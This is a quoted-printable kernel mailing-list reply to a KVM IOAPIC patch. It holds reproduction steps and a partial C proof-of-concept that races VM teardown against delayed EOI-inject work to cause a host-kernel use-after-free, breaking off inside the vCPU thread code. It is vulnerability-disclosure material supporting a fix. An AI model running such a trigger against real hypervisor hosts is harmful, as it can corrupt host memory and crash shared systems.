Received: from va-2-111.ptr.blmpb.com (va-2-111.ptr.blmpb.com [209.127.231.111])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C66F1433E8C
	for <kvm@vger.kernel.org>; Sun,  5 Jul 2026 05:19:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.127.231.111
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783228746; cv=none; b=JGeYR4/JtGj7zv07b+DkvTg/fTaCT58L8TgUmsffro1f5457L7Qj2sLiTOsAJNsvtjQATnw0rneWJjSf7fXGysEpBLGFBZSeG4NVEEjuGgF0BvjmiZQxYMr3mxF3QOPdRwzOZlYfj36N9zTlqwgowG3oyrMpT6aeLz/W2tSrZfg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783228746; c=relaxed/simple;
	bh=s3KlsJmkkX5FfD2INoUsqGTyqeO7adUJGGAW25tQO0U=;
	h=Date:Message-Id:To:Cc:Subject:From:Mime-Version:References:
	 In-Reply-To:Content-Type; b=BrIwLMqMdQFsUuC2AIEXQdSVJQkVfUkUIITRKgrYGZtHRbyU+n+l0F1MclmMokmT8U/ZmJ6LAl8DYW4FXJpOQZ63O8KYh3l+S17K8YsXspRb047D71C6Izq1j2QRBPX9TWNcjzNYEztAZYgAxSOOuLpLzN2nKn57DDSWVoaFMwc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=bytedance.com; spf=pass smtp.mailfrom=bytedance.com; dkim=pass (2048-bit key) header.d=bytedance.com header.i=@bytedance.com header.b=JWsllaEl; arc=none smtp.client-ip=209.127.231.111
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=bytedance.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=bytedance.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=bytedance.com header.i=@bytedance.com header.b="JWsllaEl"
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 s=2212171451; d=bytedance.com; t=1783228732; h=from:subject:
 mime-version:from:date:message-id:subject:to:cc:reply-to:content-type:
 mime-version:in-reply-to:message-id;
 bh=s3KlsJmkkX5FfD2INoUsqGTyqeO7adUJGGAW25tQO0U=;
 b=JWsllaElZtb/54Ud3S4gGgv2dBedR0o/yfOU240wyLDEvqPCIxDmQbLpO4Fw/rPTH9xjpM
 FY7lRxYmtjzg+y7EvNb8Vjh9ZGULhp5muDetUR0Aq6BWWouS97vQzrcjgVzImmSnllfZky
 e7/AOk/O0Nzjowswz6yO/KPPWxDN3K8NcAuiDqVOJC5iCgoa7ZiFcnOzxGUUZT6goLhxAV
 fTH23UOtemcIpAT26OoSnGs0kjUrzqZWAB8+ii5tCauM6XNH9/1Ve2mB49aVZFn+BLoV5J
 mWS6KL3o4yBqikOri2o7iEdGFTVnFZGUtswHJdKIuzXYWLm0EJiXeJdGhgEr4g==
Content-Transfer-Encoding: quoted-printable
Date: Sun, 05 Jul 2026 13:18:49 +0800
Message-Id: <88ba60ad32ba851426a3f6590b0e402210991b4a.e33b58ce.0008.4e1c.aa62.c1024b242cbf@bytedance.com>
To: "Weiming Shi" <bestswngs@gmail.com>
Cc: "Sean Christopherson" <seanjc@google.com>, 
	"Paolo Bonzini" <pbonzini@redhat.com>, <kvm@vger.kernel.org>, 
	"Weiming Shi" <bestswngs@gmail.com>, 
	"Xuanqing Shi" <shixuanqing.11@bytedance.com>
Subject: Re: [PATCH] KVM: x86/ioapic: Cancel eoi_inject work before destroying vCPUs
From: =?utf-8?q?=E7=8E=8B=E4=BC=97?= <wangzhong.c0ss4ck@bytedance.com>
Precedence: bulk
X-Mailing-List: kvm@vger.kernel.org
List-Id: <kvm.vger.kernel.org>
List-Subscribe: <mailto:kvm+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:kvm+unsubscribe@vger.kernel.org>
Mime-Version: 1.0
References: <20260705050443.1331662-1-bestswngs@gmail.com>
In-Reply-To: <20260705050443.1331662-1-bestswngs@gmail.com>
X-Lms-Return-Path: <lba+16a49e93a+39cc85+vger.kernel.org+wangzhong.c0ss4ck@bytedance.com>
Content-Type: text/plain; charset=UTF-8

Reproduction Steps

1. prepare x86_64 kernel image

```
make O=3Dbuild-kasan-outline x86_64_defconfig

./scripts/config --file build-kasan-outline/.config \
=C2=A0=C2=A0=C2=A0 -e MODULES \
=C2=A0=C2=A0=C2=A0 -m KVM -m KVM_AMD -m KVM_INTEL -e KVM_IOAPIC \
=C2=A0=C2=A0=C2=A0 -e KASAN -e KASAN_GENERIC -e KASAN_OUTLINE \
=C2=A0=C2=A0=C2=A0 -d KASAN_INLINE -e KASAN_STACK -e KASAN_VMALLOC -e KASAN=
_EXTRA_INFO \
=C2=A0=C2=A0=C2=A0 -e DEBUG_INFO_DWARF5 -d DEBUG_INFO_NONE \
=C2=A0=C2=A0=C2=A0 -e FRAME_POINTER -e UNWINDER_FRAME_POINTER -d UNWINDER_O=
RC \
=C2=A0=C2=A0=C2=A0 -d PANIC_ON_OOPS --set-val PANIC_TIMEOUT 0 \
=C2=A0=C2=A0=C2=A0 -e DEVTMPFS -e DEVTMPFS_MOUNT -e BLK_DEV_INITRD \
=C2=A0=C2=A0=C2=A0 -e VIRTIO -e VIRTIO_PCI -e VIRTIO_BLK -e VIRTIO_NET

make O=3Dbuild-kasan-outline olddefconfig
make O=3Dbuild-kasan-outline -j$(nproc) bzImage modules
make O=3Dbuild-kasan-outline INSTALL_MOD_PATH=3Dinitramfs-kasan-outline mod=
ules_install
```


2. prepare qemu + initramfs

Build the PoC statically and copy it into the initramfs:

```
gcc -O2 -static -pthread -Wall -Wextra \
=C2=A0=C2=A0=C2=A0 -o initramfs-kasan-outline/bin/kvm-x86-poc kvm-x86-poc.c
```

The minimal initramfs contains BusyBox, libc/ld-linux for BusyBox, the KASA=
N
kernel modules installed above, and an `/init` script which mounts proc/sys=
/dev,
loads `kvm` and `kvm_amd`, verifies `/dev/kvm`, then drops to a shell.

Pack the initramfs:

```
(cd initramfs-kasan-outline && \
=C2=A0=C2=A0=C2=A0 find . -print0 | cpio --null -ov --format=3Dnewc | gzip =
-9 \
=C2=A0=C2=A0=C2=A0 > ../initramfs-kasan-outline.cpio.gz)
```

3. boot qemu with the kernel image

```
qemu-system-x86_64 \
=C2=A0=C2=A0=C2=A0 -machine q35 \
=C2=A0=C2=A0=C2=A0 -accel tcg,thread=3Dmulti \
=C2=A0=C2=A0=C2=A0 -cpu max,svm=3Don,npt=3Don,vgif=3Don \
=C2=A0=C2=A0=C2=A0 -smp 4 \
=C2=A0=C2=A0=C2=A0 -m 4096 \
=C2=A0=C2=A0=C2=A0 -kernel build-kasan-outline/arch/x86/boot/bzImage \
=C2=A0=C2=A0=C2=A0 -initrd initramfs-kasan-outline.cpio.gz \
=C2=A0=C2=A0=C2=A0 -append "console=3DttyS0 earlyprintk=3Dserial panic=3D0 =
oops=3Dpanic panic_on_warn=3D0 nokaslr" \
=C2=A0=C2=A0=C2=A0 -nographic \
=C2=A0=C2=A0=C2=A0 -no-reboot \
=C2=A0=C2=A0=C2=A0 -serial mon:stdio
```

4. run the PoC inside the guest
(tested on AMD EPYC 9Y24 CPU, theoretically the PoC also works on Intel CPU=
)
```
modprobe kvm
modprobe kvm_amd

POC_ITERS=3D100 POC_NVCPU=3D64 POC_ARM_TIMEOUT_MS=3D15000 POC_SLEEP_US=3D10=
000 /bin/kvm-x86-poc
```

PoC:
```
// SPDX-License-Identifier: GPL-2.0
//
// PoC: KVM in-kernel IOAPIC "delayed EOI-inject" work Use-After-Free
// =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
//
// Root cause (verified against linux v7.0-rc7 ... v7.2-rc1):
//
// =C2=A0 * A guest that keeps a level-triggered IOAPIC pin asserted and EO=
Is it
// =C2=A0 =C2=A0 10000 times in a row makes the host schedule a *delayed_wo=
rk*:
//
// =C2=A0 =C2=A0 =C2=A0=C2=A0 arch/x86/kvm/ioapic.c :
// =C2=A0 =C2=A0 =C2=A0=C2=A0 kvm_ioapic_update_eoi_one():
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (ioapic->irq_eoi[pin] =3D=3D=
 IOAPIC_SUCCESSIVE_IRQ_MAX_COUNT) {=C2=A0 // 10000
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 schedule_delayed_=
work(&ioapic->eoi_inject, HZ / 100); =C2=A0 =C2=A0 =C2=A0 // ~10ms
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 ...
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 }
//
// =C2=A0 * That work (kvm_ioapic_eoi_inject_work) re-delivers the IRQ ~10m=
s later:
// =C2=A0 =C2=A0 =C2=A0=C2=A0 kvm_ioapic_eoi_inject_work() -> ioapic_servic=
e()
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 -> kvm_irq_delivery_to_apic() -> __kvm=
_irq_delivery_to_apic_fast()
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 -> dst[i] =3D <stale pointer from kvm-=
>arch.apic_map>
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 -> kvm_apic_set_irq(dst[i]->vcpu, ...)=
 -> writes into apic->regs =C2=A0 // SINK
//
// =C2=A0 * VM teardown frees the vCPUs / LAPICs BEFORE cancelling that wor=
k:
// =C2=A0 =C2=A0 =C2=A0=C2=A0 arch/x86/kvm/x86.c : kvm_arch_destroy_vm():
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 kvm_destroy_vcpus(kvm); =C2=A0 =
=C2=A0=C2=A0 // frees kvm_lapic + free_page(apic->regs)
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 ...
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 kvm_ioapic_destroy(kvm); =C2=A0=
 =C2=A0 // <-- only here: cancel_delayed_work_sync()
//
// =C2=A0 =C2=A0 kvm_arch_pre_destroy_vm() cancels the PIT / kvmclock / MMU=
 workers but
// =C2=A0 =C2=A0 NOT ioapic->eoi_inject -- even though its own comment warn=
s that
// =C2=A0 =C2=A0 "iterating over vCPUs in a different task while vCPUs are =
being freed
// =C2=A0 =C2=A0=C2=A0 ... will lead to use-after-free".
//
// =C2=A0 =C2=A0 kvm_free_lapic() frees the LAPIC and its regs page but doe=
s NOT
// =C2=A0 =C2=A0 recalculate kvm->arch.apic_map, so the map keeps dangling =
kvm_lapic*
// =C2=A0 =C2=A0 entries until it is itself freed (after kvm_ioapic_destroy=
()).
//
// =C2=A0 =3D> If the ~10ms timer fires while / after kvm_destroy_vcpus() h=
as freed the
// =C2=A0 =C2=A0=C2=A0 target LAPIC, the work writes into freed memory: sla=
b-use-after-free.
//
// This is a RACE. To *observe* it you must run this PoC inside a guest ker=
nel
// built with CONFIG_KASAN=3Dy and CONFIG_KVM_IOAPIC=3Dy (nested virtualiza=
tion).
// Without KASAN the corruption is silent / intermittent -- do NOT run it o=
n a
// production host.
//
// Strategy:
// =C2=A0 for many iterations:
// =C2=A0 =C2=A0 1. create a fresh VM with an in-kernel irqchip and N vCPUs
// =C2=A0 =C2=A0 2. vCPU0 runs a tiny 32-bit guest that:
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 - enables its LAPIC
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 - programs IOAPIC pin 1 as level-trigg=
ered, vector 0x30, dest APIC 0
// =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 - takes+EOIs the interrupt in a tight =
loop
// =C2=A0 =C2=A0 =C2=A0=C2=A0 Host counts the EOIs; at #10000 it arms ioapi=
c->eoi_inject (+10ms) and
// =C2=A0 =C2=A0 =C2=A0=C2=A0 pauses delivery. The guest then signals us wi=
th `out 0xF4`.
// =C2=A0 =C2=A0 3. sleep ~9-10ms so the work's timer is about to expire, t=
hen destroy the
// =C2=A0 =C2=A0 =C2=A0=C2=A0 VM (close all fds). If the work fires during =
kvm_destroy_vcpus() -> UAF.
// =C2=A0 The per-iteration sleep is swept slightly to cover scheduling jit=
ter.
//
// Build (static, for a minimal initramfs):=C2=A0 gcc -O2 -static -pthread =
-o poc kvm_ioapic_eoi_uaf.c
//
// Env knobs:=C2=A0 POC_ITERS (default 200000)=C2=A0 POC_NVCPU (default 16)
// =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 POC_SLEEP_US (base sleep, defa=
ult 9000)
//
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/kvm.h>

#define GUEST_MEM_SIZE=C2=A0 (4 * 1024 * 1024) =C2=A0 // 4 MiB of low RAM
#define ENTRY_GPA =C2=A0 =C2=A0 =C2=A0 0x1000
#define HANDLER_GPA =C2=A0 =C2=A0 0x1200
#define IDT_GPA =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x2000
#define GDT_GPA =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x3000
#define COUNTER_GPA =C2=A0 =C2=A0 0x4000
#define STACK_GPA =C2=A0 =C2=A0 =C2=A0 0x8000

#define IOAPIC_PIN =C2=A0 =C2=A0=C2=A0 1 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // GSI 1
#define GUEST_VECTOR =C2=A0=C2=A0 0x30

// -------- guest machine code (32-bit protected mode, flat, no paging) ---=
-----
//
// Entry @ 0x1000: enable LAPIC, program IOAPIC RTE for pin 1, sti, poll co=
unter
// until it reaches 10000, then `out 0xF4` to signal "armed", then hlt-loop=
.
static const uint8_t guest_entry[] =3D {
=C2=A0=C2=A0=C2=A0 /* mov edi, 0xFEE000F0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0=C2=A0 */ 0xBF, 0xF0, 0x00, 0xE0, 0xFE,
=C2=A0=C2=A0=C2=A0 /* mov eax, 0x000001FF =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0=C2=A0 */ 0xB8, 0xFF, 0x01, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* mov [edi], eax =C2=A0 ; LAPIC SVR =C2=A0 */ 0x89, 0x0=
7,
=C2=A0=C2=A0=C2=A0 /* mov esi, 0xFEC00000 ; IOAPIC =C2=A0 */ 0xBE, 0x00, 0x=
00, 0xC0, 0xFE,
=C2=A0=C2=A0=C2=A0 /* mov ecx, 0xFEC00010 ; data =C2=A0 =C2=A0 */ 0xB9, 0x1=
0, 0x00, 0xC0, 0xFE,
=C2=A0=C2=A0=C2=A0 /* mov eax, 0x13 =C2=A0=C2=A0 ; RTE1 high =C2=A0 */ 0xB8=
, 0x13, 0x00, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* mov [esi], eax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 */ 0x89, 0x06,
=C2=A0=C2=A0=C2=A0 /* xor eax, eax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 */ 0x31, 0xC0,
=C2=A0=C2=A0=C2=A0 /* mov [ecx], eax =C2=A0 ; dest =3D 0 =C2=A0=C2=A0 */ 0x=
89, 0x01,
=C2=A0=C2=A0=C2=A0 /* mov eax, 0x12 =C2=A0=C2=A0 ; RTE1 low =C2=A0=C2=A0 */=
 0xB8, 0x12, 0x00, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* mov [esi], eax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 */ 0x89, 0x06,
=C2=A0=C2=A0=C2=A0 /* mov eax, 0x00008030 ; vec|lvl=C2=A0 */ 0xB8, 0x30, 0x=
80, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* mov [ecx], eax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 */ 0x89, 0x01,
=C2=A0=C2=A0=C2=A0 /* sti =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 */ 0xFB,
=C2=A0=C2=A0=C2=A0 /* poll: =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 */
=C2=A0=C2=A0=C2=A0 /* cmp dword [0x4000], 10000 =C2=A0 =C2=A0=C2=A0 */ 0x81=
, 0x3D, 0x00, 0x40, 0x00, 0x00, 0x10, 0x27, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* jb poll =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 ; -1=
2 =C2=A0 =C2=A0 =C2=A0 */ 0x72, 0xF4,
=C2=A0=C2=A0=C2=A0 /* mov al, 0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 */ 0xB0, 0x00,
=C2=A0=C2=A0=C2=A0 /* out 0xF4, al =C2=A0 ; signal armed=C2=A0 */ 0xE6, 0xF=
4,
=C2=A0=C2=A0=C2=A0 /* done: hlt =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 */ 0xF4,
=C2=A0=C2=A0=C2=A0 /* jmp done =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 ; -3 =C2=
=A0 =C2=A0 =C2=A0=C2=A0 */ 0xEB, 0xFD,
};

// Handler @ 0x1200: write LAPIC EOI, inc counter, iretd.
static const uint8_t guest_handler[] =3D {
=C2=A0=C2=A0=C2=A0 /* mov edi, 0xFEE000B0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0=C2=A0 */ 0xBF, 0xB0, 0x00, 0xE0, 0xFE,
=C2=A0=C2=A0=C2=A0 /* xor eax, eax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 */ 0x31, 0xC0,
=C2=A0=C2=A0=C2=A0 /* mov [edi], eax =C2=A0 ; LAPIC EOI =C2=A0 */ 0x89, 0x0=
7,
=C2=A0=C2=A0=C2=A0 /* inc dword [0x4000] =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 */ 0xFF, 0x05, 0x00, 0x40, 0x00, 0x00,
=C2=A0=C2=A0=C2=A0 /* iretd =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 */ 0xCF,
};

static int kvm_fd =3D -1;
static int dbg =3D 0; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0=C2=A0 // POC_DEBUG=3D1 -> print exit reasons

void noop_handler(int sig); =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // defined at=
 end of file

struct vm {
=C2=A0=C2=A0=C2=A0 int vm_fd;
=C2=A0=C2=A0=C2=A0 int nvcpu;
=C2=A0=C2=A0=C2=A0 int *vcpu_fd; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 // [nvcpu]
=C2=A0=C2=A0=C2=A0 struct kvm_run *run0; =C2=A0 =C2=A0 =C2=A0 // vCPU0's ru=
n struct
=C2=A0=C2=A0=C2=A0 size_t run0_sz;
=C2=A0=C2=A0=C2=A0 uint8_t *mem; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 // guest RAM (host mapping)
};

// vCPU0 thread state
static volatile int g_armed;
static volatile int g_stop;

static void die(const char *m) { perror(m); exit(1); }

// Build one 32-bit interrupt gate (8 bytes) into `dst`.
static void set_idt_gate(uint8_t *idt, int vec, uint32_t handler, uint16_t =
sel)
{
=C2=A0=C2=A0=C2=A0 uint8_t *g =3D idt + vec * 8;
=C2=A0=C2=A0=C2=A0 g[0] =3D handler & 0xff;
=C2=A0=C2=A0=C2=A0 g[1] =3D (handler >> 8) & 0xff;
=C2=A0=C2=A0=C2=A0 g[2] =3D sel & 0xff;
=C2=A0=C2=A0=C2=A0 g[3] =3D (sel >> 8) & 0xff;
=C2=A0=C2=A0=C2=A0 g[4] =3D 0;
=C2=A0=C2=A0=C2=A0 g[5] =3D 0x8E; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // present, DPL0, 32-bit interrup=
t gate
=C2=A0=C2=A0=C2=A0 g[6] =3D (handler >> 16) & 0xff;
=C2=A0=C2=A0=C2=A0 g[7] =3D (handler >> 24) & 0xff;
}

static void set_flat_seg(struct kvm_segment *s, uint16_t sel, uint8_t type)
{
=C2=A0=C2=A0=C2=A0 memset(s, 0, sizeof(*s));
=C2=A0=C2=A0=C2=A0 s->selector =3D sel;
=C2=A0=C2=A0=C2=A0 s->base =3D 0;
=C2=A0=C2=A0=C2=A0 s->limit =3D 0xffffffff;
=C2=A0=C2=A0=C2=A0 s->type =3D type; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // 0xB code, 0x3 data
=C2=A0=C2=A0=C2=A0 s->present =3D 1;
=C2=A0=C2=A0=C2=A0 s->dpl =3D 0;
=C2=A0=C2=A0=C2=A0 s->db =3D 1; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // 32-bit
=C2=A0=C2=A0=C2=A0 s->s =3D 1; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // code/data (not system)
=C2=A0=C2=A0=C2=A0 s->l =3D 0;
=C2=A0=C2=A0=C2=A0 s->g =3D 1; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // 4KiB granularity
=C2=A0=C2=A0=C2=A0 s->avl =3D 0;
}

static void setup_guest_memory(struct vm *vm)
{
=C2=A0=C2=A0=C2=A0 uint8_t *m =3D vm->mem;

=C2=A0=C2=A0=C2=A0 // Code + handler.
=C2=A0=C2=A0=C2=A0 memcpy(m + ENTRY_GPA, =C2=A0 guest_entry, =C2=A0 sizeof(=
guest_entry));
=C2=A0=C2=A0=C2=A0 memcpy(m + HANDLER_GPA, guest_handler, sizeof(guest_hand=
ler));

=C2=A0=C2=A0=C2=A0 // IDT: point *every* vector at the handler (code select=
or 0x08). The real
=C2=A0=C2=A0=C2=A0 // IRQ is 0x30, but the LAPIC can also raise its spuriou=
s vector (0xFF) etc.;
=C2=A0=C2=A0=C2=A0 // leaving those gates empty faults into a null gate -> =
triple fault. The
=C2=A0=C2=A0=C2=A0 // handler is generic (EOI + inc + iretd) so it is safe =
for any vector.
=C2=A0=C2=A0=C2=A0 for (int v =3D 0; v < 256; v++)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 set_idt_gate(m + IDT_GPA, v, HANDLER_GPA, =
0x08);

=C2=A0=C2=A0=C2=A0 // GDT: null / flat code (0x08) / flat data (0x10).
=C2=A0=C2=A0=C2=A0 static const uint8_t gdt[24] =3D {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 0,0,0,0,0,0,0,0, =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // null
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 0xFF,0xFF,0,0,0, 0x9A, 0xCF, 0, =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 // 0x08 code, base0 lim4G g=3D1 db=3D1
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 0xFF,0xFF,0,0,0, 0x92, 0xCF, 0, =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 // 0x10 data
=C2=A0=C2=A0=C2=A0 };
=C2=A0=C2=A0=C2=A0 memcpy(m + GDT_GPA, gdt, sizeof(gdt));

=C2=A0=C2=A0=C2=A0 // Counter starts at 0 (mem is fresh MAP_ANONYMOUS, alre=
ady zeroed).
}

static void setup_vcpu0_regs(struct vm *vm)
{
=C2=A0=C2=A0=C2=A0 int fd =3D vm->vcpu_fd[0];
=C2=A0=C2=A0=C2=A0 struct kvm_sregs sregs;
=C2=A0=C2=A0=C2=A0 struct kvm_regs regs;

=C2=A0=C2=A0=C2=A0 if (ioctl(fd, KVM_GET_SREGS, &sregs) < 0) die("KVM_GET_S=
REGS");

=C2=A0=C2=A0=C2=A0 set_flat_seg(&sregs.cs, 0x08, 0xB); =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 // exec/read, accessed
=C2=A0=C2=A0=C2=A0 set_flat_seg(&sregs.ds, 0x10, 0x3);
=C2=A0=C2=A0=C2=A0 sregs.es =3D sregs.fs =3D sregs.gs =3D sregs.ss =3D sreg=
s.ds;
=C2=A0=C2=A0=C2=A0 sregs.es.selector =3D sregs.fs.selector =3D sregs.gs.sel=
ector =3D sregs.ss.selector =3D 0x10;

=C2=A0=C2=A0=C2=A0 sregs.gdt.base =3D GDT_GPA;=C2=A0 sregs.gdt.limit =3D 0x=
17;
=C2=A0=C2=A0=C2=A0 sregs.idt.base =3D IDT_GPA;=C2=A0 sregs.idt.limit =3D 0x=
7FF;

=C2=A0=C2=A0=C2=A0 sregs.cr0 =3D 0x11; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // PE=3D1, ET=
=3D1 (paging OFF)
=C2=A0=C2=A0=C2=A0 sregs.cr2 =3D sregs.cr3 =3D sregs.cr4 =3D 0;
=C2=A0=C2=A0=C2=A0 sregs.efer =3D 0;

=C2=A0=C2=A0=C2=A0 if (ioctl(fd, KVM_SET_SREGS, &sregs) < 0) die("KVM_SET_S=
REGS");

=C2=A0=C2=A0=C2=A0 memset(&regs, 0, sizeof(regs));
=C2=A0=C2=A0=C2=A0 regs.rip =3D ENTRY_GPA;
=C2=A0=C2=A0=C2=A0 regs.rsp =3D STACK_GPA;
=C2=A0=C2=A0=C2=A0 regs.rflags =3D 0x2; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // reserved bit; IF=
 set later by `sti`
=C2=A0=C2=A0=C2=A0 if (ioctl(fd, KVM_SET_REGS, &regs) < 0) die("KVM_SET_REG=
S");
}

static void *vcpu0_thread(void *arg)
{
=C2=A0=C2=A0=C2=A0 struct vm *vm =3D arg;
=C2=A0=C2=A0=C2=A0 struct kvm_run *run =3D vm->run0;

=C2=A0=C2=A0=C2=A0 for (;;) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 int r =3D ioctl(vm->vcpu_fd[0], KVM_RUN, 0=
);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if (r < 0) {
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (errno =3D=3D EINTR) {
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (g_stop) re=
turn NULL;
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 continue;
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 }
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (dbg) fprintf(stderr, "[d=
bg] KVM_RUN errno=3D%d\n", errno);
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 return NULL;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 }
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if (dbg) {
